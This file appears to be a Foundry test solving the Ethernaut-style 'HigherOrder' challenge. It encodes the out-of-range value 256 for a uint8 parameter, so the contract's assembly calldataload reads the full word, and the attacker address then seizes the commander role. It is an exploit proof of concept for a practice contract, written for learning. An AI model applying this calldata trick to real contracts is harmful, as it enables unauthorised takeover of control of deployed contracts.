// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import {Test, console} from "forge-std/Test.sol";
import {HigherOrder} from "../src/contracts/30_HigherOrder.sol";

contract HigherOrderTest is Test {
    address private owner = makeAddr("owner");
    address private attacker = makeAddr("attacker");
    HigherOrder private higherOrder;

    function setUp() public {
        vm.prank(owner);
        higherOrder = new HigherOrder();
    }

    function test_HigherOrderExploitVulnerability() public {
        vm.startPrank(attacker);

        /*
            To solve this challenge it is important to know that when you call a function like registerTreasury(uint8) with a value outside the uint8 range,
            abi.encodeWithSelector doesn’t actually enforce the 8-bit limitation on the argument. 
            Instead, it pads the input to a full 32 bytes in calldata regardless of the argument's declared type.

            So to bypass the uint8 param restriction we have to take in mind that
            the abi.encodeWithSelector(HigherOrder.registerTreasury.selector, 256) will work beacuse:
            1. Solidity pads all arguments to 32 bytes in calldata.
            2. Inline assembly (calldataload) reads the full 32 bytes, not limited by the uint8 type.
        */

        bytes memory callData = abi.encodeWithSelector(
            HigherOrder.registerTreasury.selector,
            256
        );

        (bool success, ) = address(higherOrder).call(callData);

        if (!success) {
            revert();
        }

        higherOrder.claimLeadership();
        vm.stopPrank();

        assertEq(higherOrder.commander(), attacker);
    }
}
